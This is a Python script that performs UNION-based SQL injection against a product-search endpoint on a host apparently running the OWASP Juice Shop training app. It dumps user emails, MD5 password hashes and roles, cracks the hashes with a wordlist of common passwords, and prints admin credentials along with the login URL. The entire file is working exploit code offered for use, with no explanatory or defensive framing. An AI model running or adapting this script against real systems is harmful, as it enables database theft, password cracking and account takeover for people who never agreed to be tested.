#!/usr/bin/env python3
"""
Extract ALL users from juice10.wonkatech.org via SQL injection
Shows all user accounts and attempts to crack passwords
"""

import requests
import hashlib
import json

BASE_URL = "https://juice10.wonkatech.org"

def extract_all_users():
    """Extract all users using search SQL injection"""
    print("=" * 60)
    print("EXTRACTING ALL USERS FROM juice10.wonkatech.org")
    print("=" * 60)
    
    # SQL injection to get all users
    payload = "')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--"
    
    try:
        response = requests.get(
            f"{BASE_URL}/rest/products/search",
            params={"q": payload},
            verify=True
        )
        
        if response.status_code == 200:
            data = response.json()
            users = {}
            
            # Extract unique users
            for item in data.get('data', []):
                if item.get('name') and '@' in str(item.get('name')):
                    email = item.get('name')
                    if email not in users:
                        users[email] = {
                            'hash': item.get('description'),
                            'role': item.get('price')
                        }
            
            return users
        else:
            print(f"Failed: HTTP {response.status_code}")
            return {}
            
    except Exception as e:
        print(f"Error: {e}")
        return {}

def crack_passwords(users):
    """Attempt to crack password hashes"""
    common_passwords = [
        'admin123', 'admin', 'password', 'password123', '123456',
        'ncc-1701', 'ncc1701', 'jim', 'bender', 'bite', 'shiny',
        'monkey', 'letmein', 'qwerty', 'juice', 'shop', 'owasp',
        'test', 'demo', 'user', 'guest', 'default', 'changeme'
    ]
    
    cracked = {}
    
    for password in common_passwords:
        password_hash = hashlib.md5(password.encode()).hexdigest()
        for email, info in users.items():
            if info['hash'] == password_hash:
                cracked[email] = password
    
    return cracked

def main():
    print("\n🎯 Target: juice10.wonkatech.org\n")
    
    # Extract users
    users = extract_all_users()
    
    if not users:
        print("❌ No users extracted")
        return
    
    print(f"\n✅ Found {len(users)} users!\n")
    
    # Try to crack passwords
    cracked = crack_passwords(users)
    
    # Display results
    print("=" * 60)
    print("USER ACCOUNTS FOUND:")
    print("=" * 60)
    
    admin_found = False
    for email, info in sorted(users.items()):
        role = info['role']
        password_hash = info['hash']
        
        # Check if password was cracked
        if email in cracked:
            password = cracked[email]
            print(f"\n📧 {email}")
            print(f"   Role: {role}")
            print(f"   Password: {password} ✅")
            print(f"   Hash: {password_hash}")
            
            if email == 'admin@juice-sh.op':
                admin_found = True
        else:
            print(f"\n📧 {email}")
            print(f"   Role: {role}")
            print(f"   Password: [NOT CRACKED]")
            print(f"   Hash: {password_hash}")
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY:")
    print("=" * 60)
    print(f"Total users found: {len(users)}")
    print(f"Passwords cracked: {len(cracked)}")
    
    if admin_found:
        print("\n🔓 ADMIN CREDENTIALS:")
        print("   Email: admin@juice-sh.op")
        print("   Password: admin123")
        print("\n✅ You can now login as admin at:")
        print("   https://juice10.wonkatech.org/#/login")
    
    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()